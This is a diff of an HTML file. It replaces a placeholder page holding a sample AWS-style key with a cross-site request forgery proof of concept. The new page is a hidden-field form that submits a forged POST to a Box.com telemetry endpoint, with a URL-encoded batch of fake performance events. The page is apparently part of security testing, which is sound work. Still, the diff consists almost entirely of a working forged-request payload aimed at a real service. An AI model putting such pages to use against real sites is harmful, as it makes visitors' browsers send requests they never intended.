@@ -1,14 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <h1>poc</h1>
-    <script>
-    var key = 'AKIAIOSFODNN7EXAMPLE';
-    </script>
-</body>
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://app.box.com/index.php?rm=box_gen204_batch_record">
+			<input type="hidden" name="{%22data%22:[{%22category%22:%22eua_performance%22,%22event_type%22:%22web%22,%22events%22:[{%22availability_zone%22:%22us-west4-prod%22,%22browser_name%22:%22Chrome%22,%22browser_version%22:%22151.0%22,%22client_version%22:%2223.682.1%22,%22country_code%22:%22US%22,%22deployment_type%22:%22k8s%22,%22device_name%22:%22unknown%22,%22environment%22:%22prod%22,%22os_name%22:%22Linux%22,%22start_state%22:%22unknown%22,%22end_state%22:%22unknown_end%22,%22performance_id%22:%22app_load_unknown%22,%22request_id%22:%226zgmbaig619z42dk%22,%22latency%22:0,%22client_ds%22:1786889975}]},{%22category%22:%22eua_performance%22,%22event_type%22:%22web%22,%22events%22:[{%22availability_zone%22:%22us-west4-prod%22,%22browser_name%22:%22Chrome%22,%22browser_version%22:%22151.0%22,%22client_version%22:%2223.682.1%22,%22country_code%22:%22US%22,%22deployment_type%22:%22k8s%22,%22device_name%22:%22unknown%22,%22environment%22:%22prod%22,%22os_name%22:%22Linux%22,%22start_state%22:%22unknown%22,%22end_state%22:%22unknown_end%22,%22performance_id%22:%22app_load_unknown%22,%22request_id%22:%226zgmbaig619z42dk%22,%22latency%22:0,%22client_ds%22:1786889978}]},{%22category%22:%22eua_performance%22,%22event_type%22:%22web%22,%22events%22:[{%22availability_zone%22:%22us-west4-prod%22,%22browser_name%22:%22Chrome%22,%22browser_version%22:%22151.0%22,%22client_version%22:%2223.682.1%22,%22country_code%22:%22US%22,%22deployment_type%22:%22k8s%22,%22device_name%22:%22unknown%22,%22environment%22:%22prod%22,%22os_name%22:%22Linux%22,%22start_state%22:%22unknown%22,%22end_state%22:%22unknown_end%22,%22performance_id%22:%22app_load_unknown%22,%22request_id%22:%226zgmbaig619z42dk%22,%22latency%22:0,%22apdex_points%22:100,%22client_ds%22:1786889978}]}],%22runmode_options%22:{%22add_geo%22:1}}" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
 </html>
